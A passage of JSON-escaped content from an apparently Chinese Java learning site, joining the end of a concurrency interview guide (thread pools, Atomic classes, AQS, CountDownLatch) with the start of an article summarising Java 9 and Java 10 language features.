ArrayBlockingQueue\u0026lt;\u0026gt;(QUEUE_CAPACITY), new ThreadPoolExecutor.CallerRunsPolicy()); for (int i = 0; i \u0026lt; 10; i++) { //创建WorkerThread对象（WorkerThread类实现了Runnable 接口）  Runnable worker = new MyRunnable(\u0026#34;\u0026#34; + i); //执行Runnable  executor.execute(worker); } //终止线程池  executor.shutdown(); while (!executor.isTerminated()) { } System.out.println(\u0026#34;Finished all threads\u0026#34;); } } 可以看到我们上面的代码指定了：\n corePoolSize: 核心线程数为 5。 maximumPoolSize ：最大线程数 10 keepAliveTime : 等待时间为 1L。 unit: 等待时间的单位为 TimeUnit.SECONDS。 workQueue：任务队列为 ArrayBlockingQueue，并且容量为 100; handler:饱和策略为 CallerRunsPolicy。  Output：\npool-1-thread-3 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-5 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-2 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-1 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-4 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-3 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-4 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-1 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-5 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-1 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-2 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-5 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-4 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-3 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-2 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-1 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-4 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-5 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-3 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-2 End. Time = Sun Apr 12 11:14:47 CST 2020 4.7 线程池原理分析    承接 4.6 节，我们通过代码输出结果可以看出：线程池首先会先执行 5 个任务，然后这些任务有任务被执行完的话，就会去拿新的任务执行。 大家可以先通过上面讲解的内容，分析一下到底是咋回事？（自己独立思考一会）\n现在，我们就分析上面的输出内容来简单分析一下线程池原理。\n为了搞懂线程池的原理，我们需要首先分析一下 execute方法。 在 4.6 节中的 Demo 中我们使用 executor.execute(worker)来提交一个任务到线程池中去，这个方法非常重要，下面我们来看看它的源码：\n// 存放线程池的运行状态 (runState) 和线程池内有效线程的数量 (workerCount) private final AtomicInteger ctl = new AtomicInteger(ctlOf(RUNNING, 0)); private static int workerCountOf(int c) { return c \u0026amp; CAPACITY; } private final BlockingQueue\u0026lt;Runnable\u0026gt; workQueue; public void execute(Runnable command) { // 如果任务为null，则抛出异常。  if (command == null) throw new NullPointerException(); // ctl 中保存的线程池当前的一些状态信息  int c = ctl.get(); // 下面会涉及到 3 步 操作  // 1.首先判断当前线程池中执行的任务数量是否小于 corePoolSize  // 如果小于的话，通过addWorker(command, true)新建一个线程，并将任务(command)添加到该线程中；然后，启动该线程从而执行任务。  if (workerCountOf(c) \u0026lt; corePoolSize) { if (addWorker(command, true)) return; c = ctl.get(); } // 2.如果当前执行的任务数量大于等于 corePoolSize 的时候就会走到这里  // 通过 isRunning 方法判断线程池状态，线程池处于 RUNNING 状态才会被并且队列可以加入任务，该任务才会被加入进去  if (isRunning(c) \u0026amp;\u0026amp; workQueue.offer(command)) { int recheck = ctl.get(); // 再次获取线程池状态，如果线程池状态不是 RUNNING 状态就需要从任务队列中移除任务，并尝试判断线程是否全部执行完毕。同时执行拒绝策略。  if (!isRunning(recheck) \u0026amp;\u0026amp; remove(command)) reject(command); // 如果当前线程池为空就新创建一个线程并执行。  else if (workerCountOf(recheck) == 0) addWorker(null, false); } //3. 通过addWorker(command, false)新建一个线程，并将任务(command)添加到该线程中；然后，启动该线程从而执行任务。  //如果addWorker(command, false)执行失败，则通过reject()执行相应的拒绝策略的内容。  else if (!addWorker(command, false)) reject(command); } 通过下图可以更好的对上面这 3 步做一个展示，下图是我为了省事直接从网上找到，原地址不明。\n现在，让我们在回到 4.6 节我们写的 Demo， 现在是不是很容易就可以搞懂它的原理了呢？\n没搞懂的话，也没关系，可以看看我的分析：\n 我们在代码中模拟了 10 个任务，我们配置的核心线程数为 5 、等待队列容量为 100 ，所以每次只可能存在 5 个任务同时执行，剩下的 5 个任务会被放到等待队列中去。当前的5个任务中如果有任务被执行完了，线程池就会去拿新的任务执行。\n 5. Atomic 原子类    5.1. 介绍一下 Atomic 原子类    Atomic 翻译成中文是原子的意思。在化学上，我们知道原子是构成一般物质的最小单位，在化学反应中是不可分割的。在我们这里 Atomic 是指一个操作是不可中断的。即使是在多个线程一起执行的时候，一个操作一旦开始，就不会被其他线程干扰。\n所以，所谓原子类说简单点就是具有原子/原子操作特征的类。\n并发包 java.util.concurrent 的原子类都存放在java.util.concurrent.atomic下,如下图所示。\n5.2. JUC 包中的原子类是哪 4 类?    基本类型\n使用原子的方式更新基本类型\n AtomicInteger：整形原子类 AtomicLong：长整型原子类 AtomicBoolean：布尔型原子类  数组类型\n使用原子的方式更新数组里的某个元素\n AtomicIntegerArray：整形数组原子类 AtomicLongArray：长整形数组原子类 AtomicReferenceArray：引用类型数组原子类  引用类型\n AtomicReference：引用类型原子类 AtomicStampedReference：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。 AtomicMarkableReference ：原子更新带有标记位的引用类型  对象的属性修改类型\n AtomicIntegerFieldUpdater：原子更新整形字段的更新器 AtomicLongFieldUpdater：原子更新长整形字段的更新器 AtomicReferenceFieldUpdater：原子更新引用类型字段的更新器  5.3. 讲讲 AtomicInteger 的使用    AtomicInteger 类常用方法\npublic final int get() //获取当前的值 public final int getAndSet(int newValue)//获取当前的值，并设置新的值 public final int getAndIncrement()//获取当前的值，并自增 public final int getAndDecrement() //获取当前的值，并自减 public final int getAndAdd(int delta) //获取当前的值，并加上预期的值 boolean compareAndSet(int expect, int update) //如果输入的数值等于预期值，则以原子方式将该值设置为输入值（update） public final void lazySet(int newValue)//最终设置为newValue,使用 lazySet 设置之后可能导致其他线程在之后的一小段时间内还是可以读到旧的值。 AtomicInteger 类的使用示例\n使用 AtomicInteger 之后，不用对 increment() 方法加锁也可以保证线程安全。\nclass AtomicIntegerTest { private AtomicInteger count = new AtomicInteger(); //使用AtomicInteger之后，不需要对该方法加锁，也可以实现线程安全。  public void increment() { count.incrementAndGet(); } public int getCount() { return count.get(); } } 5.4. 能不能给我简单介绍一下 AtomicInteger 类的原理    AtomicInteger 线程安全原理简单分析\nAtomicInteger 类的部分源码：\n// setup to use Unsafe.compareAndSwapInt for updates（更新操作时提供“比较并替换”的作用） private static final Unsafe unsafe = Unsafe.getUnsafe(); private static final long valueOffset; static { try { valueOffset = unsafe.objectFieldOffset (AtomicInteger.class.getDeclaredField(\u0026#34;value\u0026#34;)); } catch (Exception ex) { throw new Error(ex); } } private volatile int value; AtomicInteger 类主要利用 CAS (compare and swap) + volatile 和 native 方法来保证原子操作，从而避免 synchronized 的高开销，执行效率大为提升。\nCAS 的原理是拿期望的值和原本的一个值作比较，如果相同则更新成新的值。UnSafe 类的 objectFieldOffset() 方法是一个本地方法，这个方法是用来拿到“原来的值”的内存地址，返回值是 valueOffset。另外 value 是一个 volatile 变量，在内存中可见，因此 JVM 可以保证任何时刻任何线程总能拿到该变量的最新值。\n关于 Atomic 原子类这部分更多内容可以查看我的这篇文章：并发编程面试必备：JUC 中的 Atomic 原子类总结\n6. AQS    6.1. AQS 介绍    AQS 的全称为（AbstractQueuedSynchronizer），这个类在java.util.concurrent.locks包下面。\nAQS 是一个用来构建锁和同步器的框架，使用 AQS 能简单且高效地构造出大量应用广泛的同步器，比如我们提到的 ReentrantLock，Semaphore，其他的诸如 ReentrantReadWriteLock，SynchronousQueue，FutureTask 等等皆是基于 AQS 的。当然，我们自己也能利用 AQS 非常轻松容易地构造出符合我们自己需求的同步器。\n6.2. AQS 原理分析    AQS 原理这部分参考了部分博客，在 5.2 节末尾放了链接。\n 在面试中被问到并发知识的时候，大多都会被问到“请你说一下自己对于 AQS 原理的理解”。下面给大家一个示例供大家参加，面试不是背题，大家一定要加入自己的思想，即使加入不了自己的思想也要保证自己能够通俗的讲出来而不是背出来。\n 下面大部分内容其实在 AQS 类注释上已经给出了，不过是英语看着比较吃力一点，感兴趣的话可以看看源码。\n6.2.1. AQS 原理概览    AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制，这个机制 AQS 是用 CLH 队列锁实现的，即将暂时获取不到锁的线程加入到队列中。\n CLH(Craig,Landin and Hagersten)队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。\n 看个 AQS(AbstractQueuedSynchronizer)原理图：\nAQS 使用一个 int 成员变量来表示同步状态，通过内置的 FIFO 队列来完成获取资源线程的排队工作。AQS 使用 CAS 对该同步状态进行原子操作实现对其值的修改。\nprivate volatile int state;//共享变量，使用volatile修饰保证线程可见性 状态信息通过 protected 类型的 getState，setState，compareAndSetState 进行操作\n//返回同步状态的当前值 protected final int getState() { return state; } //设置同步状态的值 protected final void setState(int newState) { state = newState; } //原子地（CAS操作）将同步状态值设置为给定值update如果当前同步状态的值等于expect（期望值） protected final boolean compareAndSetState(int expect, int update) { return unsafe.compareAndSwapInt(this, stateOffset, expect, update); } 6.2.2. AQS 对资源的共享方式    AQS 定义两种资源共享方式\n Exclusive（独占）：只有一个线程能执行，如 ReentrantLock。又可分为公平锁和非公平锁：  公平锁：按照线程在队列中的排队顺序，先到者先拿到锁 非公平锁：当线程要获取锁时，无视队列顺序直接去抢锁，谁抢到就是谁的   Share（共享）：多个线程可同时执行，如 CountDownLatch、Semaphore、 CyclicBarrier、ReadWriteLock 我们都会在后面讲到。  ReentrantReadWriteLock 可以看成是组合式，因为 ReentrantReadWriteLock 也就是读写锁允许多个线程同时对某一资源进行读。\n不同的自定义同步器争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源 state 的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队/唤醒出队等），AQS 已经在顶层实现好了。\n6.2.3. AQS 底层使用了模板方法模式    同步器的设计是基于模板方法模式的，如果需要自定义同步器一般的方式是这样（模板方法模式很经典的一个应用）：\n 使用者继承 AbstractQueuedSynchronizer 并重写指定的方法。（这些重写方法很简单，无非是对于共享资源 state 的获取和释放） 将 AQS 组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。  这和我们以往通过实现接口的方式有很大区别，这是模板方法模式很经典的一个运用。\nAQS 使用了模板方法模式，自定义同步器时需要重写下面几个 AQS 提供的模板方法：\nisHeldExclusively()//该线程是否正在独占资源。只有用到condition才需要去实现它。 tryAcquire(int)//独占方式。尝试获取资源，成功则返回true，失败则返回false。 tryRelease(int)//独占方式。尝试释放资源，成功则返回true，失败则返回false。 tryAcquireShared(int)//共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。 tryReleaseShared(int)//共享方式。尝试释放资源，成功则返回true，失败则返回false。  默认情况下，每个方法都抛出 UnsupportedOperationException。 这些方法的实现必须是内部线程安全的，并且通常应该简短而不是阻塞。AQS 类中的其他方法都是 final ，所以无法被其他类使用，只有这几个方法可以被其他类使用。\n以 ReentrantLock 为例，state 初始化为 0，表示未锁定状态。A 线程 lock()时，会调用 tryAcquire()独占该锁并将 state+1。此后，其他线程再 tryAcquire()时就会失败，直到 A 线程 unlock()到 state=0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A 线程自己是可以重复获取此锁的（state 会累加），这就是可重入的概念。但要注意，获取多少次就要释放多少次，这样才能保证 state 是能回到零态的。\n再以 CountDownLatch 以例，任务分为 N 个子线程去执行，state 也初始化为 N（注意 N 要与线程个数一致）。这 N 个子线程是并行执行的，每个子线程执行完后 countDown() 一次，state 会 CAS(Compare and Swap)减 1。等到所有子线程都执行完后(即 state=0)，会 unpark()主调用线程，然后主调用线程就会从 await() 函数返回，继续后余动作。\n一般来说，自定义同步器要么是独占方法，要么是共享方式，他们也只需实现tryAcquire-tryRelease、tryAcquireShared-tryReleaseShared中的一种即可。但 AQS 也支持自定义同步器同时实现独占和共享两种方式，如ReentrantReadWriteLock。\n推荐两篇 AQS 原理和相关源码分析的文章：\n https://www.cnblogs.com/waterystone/p/4920797.html https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html  6.3. AQS 组件总结     Semaphore(信号量)-允许多个线程同时访问： synchronized 和 ReentrantLock 都是一次只允许一个线程访问某个资源，Semaphore(信号量)可以指定多个线程同时访问某个资源。 CountDownLatch （倒计时器）： CountDownLatch 是一个同步工具类，用来协调多个线程之间的同步。这个工具通常用来控制线程等待，它可以让某一个线程等待直到倒计时结束，再开始执行。 CyclicBarrier(循环栅栏)： CyclicBarrier 和 CountDownLatch 非常类似，它也可以实现线程间的技术等待，但是它的功能比 CountDownLatch 更加复杂和强大。主要应用场景和 CountDownLatch 类似。CyclicBarrier 的字面意思是可循环使用（Cyclic）的屏障（Barrier）。它要做的事情是，让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续干活。CyclicBarrier 默认的构造方法是 CyclicBarrier(int parties)，其参数表示屏障拦截的线程数量，每个线程调用 await() 方法告诉 CyclicBarrier 我已经到达了屏障，然后当前线程被阻塞。  6.4. 用过 CountDownLatch 么？什么场景下用的？    CountDownLatch 的作用就是 允许 count 个线程阻塞在一个地方，直至所有线程的任务都执行完毕。之前在项目中，有一个使用多线程读取多个文件处理的场景，我用到了 CountDownLatch 。具体场景是下面这样的：\n我们要读取处理 6 个文件，这 6 个任务都是没有执行顺序依赖的任务，但是我们需要返回给用户的时候将这几个文件的处理的结果进行统计整理。\n为此我们定义了一个线程池和 count 为 6 的CountDownLatch对象 。使用线程池处理读取任务，每一个线程处理完之后就将 count-1，调用CountDownLatch对象的 await()方法，直到所有文件读取完之后，才会接着执行后面的逻辑。\n伪代码是下面这样的：\npublic class CountDownLatchExample1 { // 处理文件的数量  private static final int threadCount = 6; public static void main(String[] args) throws InterruptedException { // 创建一个具有固定线程数量的线程池对象（推荐使用构造方法创建）  ExecutorService threadPool = Executors.newFixedThreadPool(10); final CountDownLatch countDownLatch = new CountDownLatch(threadCount); for (int i = 0; i \u0026lt; threadCount; i++) { final int threadnum = i; threadPool.execute(() -\u0026gt; { try { //处理文件的业务操作  //......  } catch (InterruptedException e) { e.printStackTrace(); } finally { //表示一个文件已经被完成  countDownLatch.countDown(); } }); } countDownLatch.await(); threadPool.shutdown(); System.out.println(\u0026#34;finish\u0026#34;); } } 有没有可以改进的地方呢？\n可以使用 CompletableFuture 类来改进！Java8 的 CompletableFuture 提供了很多对多线程友好的方法，使用它可以很方便地为我们编写多线程程序，什么异步、串行、并行或者等待所有线程执行完任务什么的都非常方便。\nCompletableFuture\u0026lt;Void\u0026gt; task1 = CompletableFuture.supplyAsync(()-\u0026gt;{ //自定义业务操作  }); ...... CompletableFuture\u0026lt;Void\u0026gt; task6 = CompletableFuture.supplyAsync(()-\u0026gt;{ //自定义业务操作  }); ...... CompletableFuture\u0026lt;Void\u0026gt; headerFuture=CompletableFuture.allOf(task1,.....,task6); try { headerFuture.join(); } catch (Exception ex) { //...... } System.out.println(\u0026#34;all done. \u0026#34;); 上面的代码还可以接续优化，当任务过多的时候，把每一个 task 都列出来不太现实，可以考虑通过循环来添加任务。\n//文件夹位置 List\u0026lt;String\u0026gt; filePaths = Arrays.asList(...) // 异步处理所有文件 List\u0026lt;CompletableFuture\u0026lt;String\u0026gt;\u0026gt; fileFutures = filePaths.stream() .map(filePath -\u0026gt; doSomeThing(filePath)) .collect(Collectors.toList()); // 将他们合并起来 CompletableFuture\u0026lt;Void\u0026gt; allFutures = CompletableFuture.allOf( fileFutures.toArray(new CompletableFuture[fileFutures.size()]) ); 7 Reference     《深入理解 Java 虚拟机》 《实战 Java 高并发程序设计》 《Java 并发编程的艺术》 https://www.cnblogs.com/waterystone/p/4920797.html https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html https://www.journaldev.com/1076/java-threadlocal-example  公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java 面试突击》: 由本文档衍生的专为面试而生的《Java 面试突击》V2.0 PDF 版本公众号后台回复 \u0026ldquo;面试突击\u0026rdquo; 即可免费领取！\nJava 工程师必备学习资源: 一些 Java 工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":230,"href":"/java/new-features/java%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/","title":"java新特性总结","parent":"new-features","content":"再见Java8！Java11新特性真香    Java 8 新特性见这里：Java8 新特性最佳指南 。\n你可以在 Archived OpenJDK General-Availability Releases 上下载自己需要的 JDK 版本！\n官方的新特性说明文档地址： https://openjdk.java.net/projects/jdk/ 。\nGuide ：别人家的特性都用了几年了，我 Java 才出来，哈哈！真实！\nJava9    发布于 2017 年 9 月 21 日 。作为 Java8 之后 3 年半才发布的新版本，Java 9 带 来了很多重大的变化其中最重要的改动是 Java 平台模块系统的引入，其他还有诸如集合、Stream 流\nJava 平台模块系统    Java 平台模块系统是Jigsaw Project的一部分，把模块化开发实践引入到了 Java 平台中，可以让我们的代码可重用性更好！\n什么是模块系统？官方的定义是：A uniquely named, reusable group of related packages, as well as resources (such as images and XML files) and a module descriptor.\n简单来说，你可以将一个模块看作是一组唯一命名、可重用的包、资源和模块描述文件（module-info.java）。\n任意一个 jar 文件，只要加上一个 模块描述文件（module-info.java），就可以升级为一个模块。\n在引入了模块系统之后，JDK 被重新组织成 94 个模块。Java 应用可以通过新增的 jlink 工具，创建出只包含所依赖的 JDK 模块的自定义运行时镜像。这样可以极大的减少 Java 运行时环境的大小。\n我们可以通过 exports 关键词精准控制哪些类可以对外开放使用，哪些类只能内部使用。\nmodule my.module { //exports 公开指定包的所有公共成员  exports com.my.package.name; } module my.module { //exports…to 限制访问的成员范围  export com.my.package.name to com.specific.package; } Java 9 模块的重要特征是在其工件（artifact）的根目录中包含了一个描述模块的 module-info.java 文 件。 工件的格式可以是传统的 JAR 文件或是 Java 9 新增的 JMOD 文件。\n想要深入了解 Java 9 的模块化，参见：\n 《Project Jigsaw: Module System Quick-Start Guide》 《Java 9 Modules: part 1》  Jshell    jshell 是 Java 9 新增的一个实用工具。为 Java 提供了类似于 Python 的实时命令行交互工具。\n在 Jshell 中可以直接输入表达式并查看其执行结果。\n集合增强    增加 了 List.of()、Set.of()、Map.of() 和 Map.ofEntries()等工厂方法来创建不可变集合（这部分内容有点参考 Guava 的味道）\nList.of(\u0026#34;Java\u0026#34;, \u0026#34;C++\u0026#34;); Set.of(\u0026#34;Java\u0026#34;, \u0026#34;C++\u0026#34;); Map.of(\u0026#34;Java\u0026#34;, 1, \u0026#34;C++\u0026#34;, 2); 使用 of() 创建的集合为不可变集合，不能进行添加、删除、替换、 排序等操作，不然会报 java.lang.UnsupportedOperationException 异常。\nCollectors 中增加了新的方法 filtering() 和 flatMapping()。\nCollectors 的 filtering() 方法类似于 Stream 类的 filter() 方法，都是用于过滤元素。\n Java 8 为 Collectors 类引入了 groupingBy 操作，用于根据特定的属性将对象分组。\n List\u0026lt;String\u0026gt; list = List.of(\u0026#34;x\u0026#34;,\u0026#34;www\u0026#34;, \u0026#34;yy\u0026#34;, \u0026#34;zz\u0026#34;); Map\u0026lt;Integer, List\u0026lt;String\u0026gt;\u0026gt; result = list.stream() .collect(Collectors.groupingBy(String::length, Collectors.filtering(s -\u0026gt; !s.contains(\u0026#34;z\u0026#34;), Collectors.toList()))); System.out.println(result); // {1=[x], 2=[yy], 3=[www]} Stream \u0026amp; Optional 增强    Stream 中增加了新的方法 ofNullable()、dropWhile()、takeWhile() 以及 iterate() 方法的重载方法。\nJava 9 中的 ofNullable() 方 法允许我们创建一个单元素的 Stream，可以包含一个非空元素，也可以创建一个空 Stream。 而在 Java 8 中则不可以创建空的 Stream 。\nStream\u0026lt;String\u0026gt; stringStream = Stream.ofNullable(\u0026#34;Java\u0026#34;); System.out.println(stringStream.count());// 1 Stream\u0026lt;String\u0026gt; nullStream = Stream.ofNullable(null); System.out.println(nullStream.count());//0 takeWhile() 方法可以从 Stream 中依次获取满足条件的元素，直到不满足条件为止结束获取。\nList\u0026lt;Integer\u0026gt; integerList = List.of(11, 33, 66, 8, 9, 13); integerList.stream().takeWhile(x -\u0026gt; x \u0026lt; 50).forEach(System.out::println);// 11 33 dropWhile() 方法的效果和 takeWhile() 相反。\nList\u0026lt;Integer\u0026gt; integerList2 = List.of(11, 33, 66, 8, 9, 13); integerList2.stream().dropWhile(x -\u0026gt; x \u0026lt; 50).forEach(System.out::println);// 66 8 9 13 iterate() 方法的新重载方法提供了一个 Predicate 参数 (判断条件)来决定什么时候结束迭代\npublic static\u0026lt;T\u0026gt; Stream\u0026lt;T\u0026gt; iterate(final T seed, final UnaryOperator\u0026lt;T\u0026gt; f) { } // 新增加的重载方法 public static\u0026lt;T\u0026gt; Stream\u0026lt;T\u0026gt; iterate(T seed, Predicate\u0026lt;? super T\u0026gt; hasNext, UnaryOperator\u0026lt;T\u0026gt; next) { } 两者的使用对比如下，新的 iterate() 重载方法更加灵活一些。\n// 使用原始 iterate() 方法输出数字 1~10 Stream.iterate(1, i -\u0026gt; i + 1).limit(10).forEach(System.out::println); // 使用新的 iterate() 重载方法输出数字 1~10 Stream.iterate(1, i -\u0026gt; i \u0026lt;= 10, i -\u0026gt; i + 1).forEach(System.out::println); Optional 类中新增了 ifPresentOrElse()、or() 和 stream() 等方法\nifPresentOrElse() 方法接受两个参数 Consumer 和 Runnable ，如果 Optional 不为空调用 Consumer 参数，为空则调用 Runnable 参数。\npublic void ifPresentOrElse(Consumer\u0026lt;? super T\u0026gt; action, Runnable emptyAction) Optional\u0026lt;Object\u0026gt; objectOptional = Optional.empty(); objectOptional.ifPresentOrElse(System.out::println, () -\u0026gt; System.out.println(\u0026#34;Empty!!!\u0026#34;));// Empty!!! or() 方法接受一个 Supplier 参数 ，如果 Optional 为空则返回 Supplier 参数指定的 Optional 值。\npublic Optional\u0026lt;T\u0026gt; or(Supplier\u0026lt;? extends Optional\u0026lt;? extends T\u0026gt;\u0026gt; supplier) Optional\u0026lt;Object\u0026gt; objectOptional = Optional.empty(); objectOptional.or(() -\u0026gt; Optional.of(\u0026#34;java\u0026#34;)).ifPresent(System.out::println);//java String 存储结构变更    JDK 8 及之前的版本，String 一直是用 char[] 存储。在 Java 9 之后，String 的实现改用 byte[] 数组存储字符串。\n进程 API    Java 9 增加了 ProcessHandle 接口，可以对原生进程进行管理，尤其适合于管理长时间运行的进程。\nSystem.out.println(ProcessHandle.current().pid()); System.out.println(ProcessHandle.current().info()); 平台日志 API 和服务    Java 9 允许为 JDK 和应用配置同样的日志实现。新增了 System.LoggerFinder 用来管理 JDK 使 用的日志记录器实现。JVM 在运行时只有一个系统范围的 LoggerFinder 实例。\n我们可以通过添加自己的 System.LoggerFinder 实现来让 JDK 和应用使用 SLF4J 等其他日志记录框架。\n反应式流 （ Reactive Streams ）    在 Java9 中的 java.util.concurrent.Flow 类中新增了反应式流规范的核心接口 。\nFlow 中包含了 Flow.Publisher、Flow.Subscriber、Flow.Subscription 和 Flow.Processor 等 4 个核心接口。Java 9 还提供了SubmissionPublisher 作为Flow.Publisher 的一个实现。\n变量句柄    变量句柄是一个变量或一组变量的引用，包括静态域，非静态域，数组元素和堆外数据结构中的组成部分等\n变量句柄的含义类似于已有的方法句柄 MethodHandle ，由 Java 类 java.lang.invoke.VarHandle 来表示，可以使用类 java.lang.invoke.MethodHandles.Lookup 中的静态工厂方法来创建 VarHandle 对象。\nVarHandle 的出现替代了 java.util.concurrent.atomic 和 sun.misc.Unsafe 的部分操作。并且提供了一系列标准的内存屏障操作，用于更加细粒度的控制内存排序。在安全性、可用性、性能上都要优于现有的 API。\n改进方法句柄（Method Handle）    方法句柄从 Java7 开始引入，Java9 在类java.lang.invoke.MethodHandles 中新增了更多的静态方法来创建不同类型的方法句柄。\n接口私有方法    Java 9 允许在接口中使用私有方法。\npublic interface MyInterface { private void methodPrivate(){ } } Java9 其它新特性     try-with-resources 增强 ：在 try-with-resources 语句中可以使用 effectively-final 变量（什么是 effectively-final 变量，见这篇文章：《Effectively Final Variables in Java》 类 CompletableFuture 中增加了几个新的方法（completeAsync ，orTimeout 等） Nashorn 引擎的增强 ：Nashorn 从 Java8 开始引入的 JavaScript 引擎，Java9 对 Nashorn 做了些增强，实现了一些 ES6 的新特性（Java 11 中已经被弃用）。 I/O 流的新特性 ：增加了新的方法来读取和复制 InputStream 中包含的数据 改进应用的安全性能 ：Java 9 新增了 4 个 SHA- 3 哈希算法，SHA3-224、SHA3-256、SHA3-384 和 SHA3-512 \u0026hellip;\u0026hellip;  Java10    发布于 2018 年 3 月 20 日，最知名的特性应该是 var 关键字（局部变量类型推断）的引入了，其他还有垃圾收集器改善、GC 改进、性能提升、线程管控等一批新特性\nvar(局部变量推断)    由于太多 Java 开发者希望 Java 中引入局部变量推断，于是 Java 10 的时候它来了，也算是众望所归了！\nJava 10 提供了 var 关键字声明局部变量。\n Scala 和 Kotlin 中有 val 关键字 ( final var 组合关键字)，Java10 中并没有引入。\n Java 10 只引入了 var，而\nvar id = 0; var codefx = new URL(\u0026#34;https://mp.weixin.qq.com/\u0026#34;); var list = new ArrayList\u0026lt;\u0026gt;(); var list = List.of(1, 2, 3); var map = new HashMap\u0026lt;String, String\u0026gt;(); var p = Paths.of(\u0026#34;src/test/java/Java9FeaturesTest.java\u0026#34;); var numbers = List.of(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;); for (var n : list) System.out.print(n+ \u0026#34; \u0026#34;); var 关键字只能用于带有构造器的局部变量和 for 循环中。\nvar count=null; //❌编译不通过，不能声明为 null var r = () -\u0026gt; Math.random();//❌编译不通过,不能声明为 Lambda表达式 var array = {1,2,3};//❌编译不通过,不能声明数组 var 并不会改变 Java 是一门静态类型语言的事实，编译器负责推断出类型。\n相关阅读：《Java 10 新特性之局部变量类型推断》。\n集合增强    list，set，map 提供了静态方法copyOf()返回入参集合的一个不可变拷贝。\n以下为 JDK 的源码：\nstatic \u0026lt;E\u0026gt; List\u0026lt;E\u0026gt; copyOf(Collection\u0026lt;? extends E\u0026gt; coll) { return ImmutableCollections.listCopy(coll); } 使用 copyOf() 创建的集合为不可变集合，不能进行添加、删除、替换、 排序等操作，不然会报 java.lang.UnsupportedOperationException 异常。 IDEA 也会有相应的提示。\njava.util.stream.Collectors 中新增了静态方法，用于将流中的元素收集为不可变的集合。\nvar list = new ArrayList\u0026lt;\u0026gt;(); list.stream().collect(Collectors.toUnmodifiableList()); list.stream().collect(Collectors.toUnmodifiableSet()); Optional    新增了orElseThrow()方法来在没有值时抛出指定的异常。\nOptional.ofNullable(cache.getIfPresent(key)) .orElseThrow(() -\u0026gt; new PrestoException(NOT_FOUND, \u0026#34;Missing entry found for key: \u0026#34; + key)); 并行全垃圾回收器 G1    从 Java9 开始 G1 就了默认的垃圾回收器，G1 是以一种低延时的垃圾回收器来设计的，旨在避免进行 Full GC,但是 Java9 的 G1 的 FullGC 依然是使用单线程去完成标记清除算法,这可能会导致垃圾回收期在无法回收内存的时候触发 Full GC。\n为了最大限度地减少 Full GC 造成的应用停顿的影响，从 Java10 开始，G1 的 FullGC 改为并行的标记清除算法，同时会使用与年轻代回收和混合回收相同的并行工作线程数量，从而减少了 Full GC 的发生，以带来更好的性能提升、更大的吞吐量。\n应用程序类数据共享(扩展 CDS 功能)    在 Java 5 中就已经引入了类数据共享机制 (Class Data Sharing，简称 CDS)，允许将一组类预处理为共享归档文件，以便在运行时能够进行内存映射以减少 Java 程序的启动时间，当多个 Java 虚拟机（JVM）共享相同的归档文件时，还可以减少动态内存的占用量，同时减少多个虚拟机在同一个物理或虚拟的机器上运行时的资源占用。CDS 在当时还是 Oracle JDK 的商业特性。\nJava 10 在现有的 CDS 功能基础上再次拓展，以允许应用类放置在共享存档中。CDS 特性在原来的 bootstrap 类基础之上，扩展加入了应用类的 CDS 为 (Application Class-Data Sharing，AppCDS) 支持，大大加大了 CDS 的适用范围。其原理为：在启动时记录加载类的过程，写入到文本文件中，再次启动时直接读取此启动文本并加载。设想如果应用环境没有大的变化，启动速度就会得到提升。\nJava10 其他新特性     线程-局部管控：Java 10 中线程管控引入 JVM 安全点的概念，将允许在不运行全局 JVM 安全点的情况下实现线程回调，由线程本身或者 JVM 线程来执行，同时保持线程处于阻塞状态，这种方式使得停止单个线程变成可能，而不是只能启用或停止所有线程 备用存储装置上的堆分配：Java 10 中将使得 JVM 能够使用适用于不同类型的存储机制的堆，在可选内存设备上进行堆内存分配 统一的垃圾回收接口：Java 10 中，hotspot/gc 代码实现方面，引入一个干净的 GC 接口，改进不同 GC 源代码的隔离性，多个 GC 